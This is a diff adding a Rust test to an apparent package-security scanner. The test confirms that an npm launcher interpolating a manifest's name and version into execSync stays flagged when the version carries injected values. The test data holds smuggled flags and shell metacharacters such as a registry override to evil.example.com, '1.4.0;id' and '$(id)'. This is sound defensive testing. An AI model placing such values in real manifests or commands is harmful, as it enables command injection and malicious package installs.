@@ -793,6 +793,61 @@ fn launcher_variants_keep_code014() {
     assert_code014_stays(&evald, "eval in the launcher");
 }
 
+/// Hunt finding H1: the launcher interpolates `packageJson.version` and
+/// `.name` straight into `execSync(`npm install ${name}@${version}`)`. The
+/// CODE-016 rewrite proved only that the *expressions* resolve to the
+/// manifest's own name/version, never that the resolved *values* are safe.
+/// A `version` field carrying a smuggled flag or shell metacharacter
+/// (`"1.4.0 --registry=https://evil.example.com"`), or a `name` with one, must
+/// keep CODE-014 High. npm's publish-time semver check does not protect a
+/// clone, tarball or local install, which is exactly what Sigil scans.
+#[test]
+fn launcher_with_an_injected_version_or_name_stays_code014() {
+    // The version (and every matching platform spec, which must equal it)
+    // carries a flag or a shell metacharacter.
+    for poison in [
+        "1.4.0 --registry=https://evil.example.com",
+        "1.4.0 --unsafe-perm --foreground-scripts",
+        "1.4.0;id",
+        "1.4.0 && npx acme",
+        "1.4.0|tee",
+        "1.4.0 $(id)",
+        "1.4.0`id`",
+        "latest",
+        "^1.4.0",
+        "1.4.0 ",
+    ] {
+        let manifest = LAUNCHER_MANIFEST.replace("1.4.0", poison);
+        let entries = with(microsoft_shape(), "package/package.json", &manifest);
+        assert_code014_stays(&entries, &format!("version {poison:?}"));
+    }
+    // The control: a clean semver rewrites to CODE-016 (not CODE-014 High).
+    let clean = microsoft_shape();
+    let r = scan_owned(&clean);
+    let found = rules(&r);
+    assert!(
+        found.iter().any(|(id, _)| id == "CODE-016"),
+        "clean launcher should rewrite to CODE-016: {found:?}"
+    );
+    assert!(
+        !found
+            .iter()
+            .any(|(id, s)| id == "CODE-014" && *s == Severity::High),
+        "clean launcher should not keep CODE-014 High: {found:?}"
+    );
+    // A pre-release / build semver is still a clean rewrite.
+    for ok in ["1.4.0-beta.2", "2.0.0-rc.1+build.7", "10.20.30"] {
+        let manifest = LAUNCHER_MANIFEST.replace("1.4.0", ok);
+        let entries = with(microsoft_shape(), "package/package.json", &manifest);
+        let r = scan_owned(&entries);
+        let found = rules(&r);
+        assert!(
+            found.iter().any(|(id, _)| id == "CODE-016"),
+            "semver {ok:?} should still rewrite to CODE-016: {found:?}"
+        );
+    }
+}
+
 // ---------------------------------------------------------------------------
 // INSTALL-004 build variants keep Medium
 // ---------------------------------------------------------------------------
